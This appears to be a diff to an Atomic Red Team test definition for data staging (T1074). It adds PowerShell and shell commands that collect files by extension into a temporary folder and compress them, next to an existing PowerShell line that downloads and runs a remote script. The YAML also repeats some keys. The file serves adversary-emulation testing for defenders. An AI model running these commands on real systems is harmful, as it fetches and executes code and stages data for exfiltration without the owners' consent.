@@ -14,3 +14,84 @@ atomic_tests:
     name: powershell
     command: |
       powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/Discovery.bat')" > c:\windows\pi.log
+
+- name: Collect and Compress all file types
+  description: |
+    Collect all specified file extensions recursively from a specified file path on the target machine. All located files are copied into a temporary location before being compressed.
+
+  # Not sure if atomic-red supports multi-platform executors under a single attack name
+  # It would be nice to correlate (- windows: powershell executor && - linux: sh executor)
+  supported_platforms:
+    - windows
+    - linux
+
+  input_arguments:
+    extension:
+      description: Extensions to search for
+      type: String
+      default: .log
+
+  input_arguments:
+    path:
+      description: Path to recursively search from
+      type: Path
+      default: /
+
+  # Windows Payload
+  # Not sure if multi-line commands support powershell functions or if this would be better placed
+  # within an 'atomics/T1074/payload/windows-payload.ps1' file and utilize a (New-Object Net.WebClient).DownloadString
+  # to pull down the payload. (Not sure how to pass input arguments though)
+  executor:
+    name: powershell
+    command: |
+      $FolderPath = '{{ path }}'
+      $FileExtension = '{{ extension }}'
+
+      New-Item -ItemType directory -Path C:\temp\staging
+
+      function TestPath()  
+      { 
+          $FileExists = Test-Path $FolderPath 
+          If ($FileExists -eq $True)  
+          { 
+              Return $true 
+          } 
+          Else  
+          { 
+              Return $false 
+          } 
+      }
+
+      function ZipFiles()
+      {
+         Add-Type -Assembly System.IO.Compression.FileSystem
+         $compressionLevel = [System.IO.Compression.CompressionLevel]::Optimal
+         [System.IO.Compression.ZipFile]::CreateFromDirectory("C:\temp\staging",
+              "C:\temp\staging.zip", $compressionLevel, $false)
+      }
+       
+      $Result = (TestPath($FolderPath)); 
+       
+      If ($Result) 
+      { 
+          $Dir = get-childitem $FolderPath -Recurse -ErrorAction Ignore 
+          $List = $Dir | where {$_.extension -eq $FileExtension} 
+          $List | Copy-Item -Destination C:\temp\staging\ -ErrorAction Ignore
+      } 
+      else 
+      { 
+          "Folder path is incorrect." 
+      }
+
+      ZipFiles
+
+      Remove-Item -Recurse -Force C:\temp\staging
+
+  # Linux Payload
+  executor:
+    name: sh
+    command: |
+      mkdir -p /tmp/staging
+      find {{ path }} -name '*{{ extension }}' -exec cp -prv '{}' '/tmp/staging' ';'
+      tar -zcvf /tmp/staging.tar.gz /tmp/staging/
+      rm -rf /tmp/staging
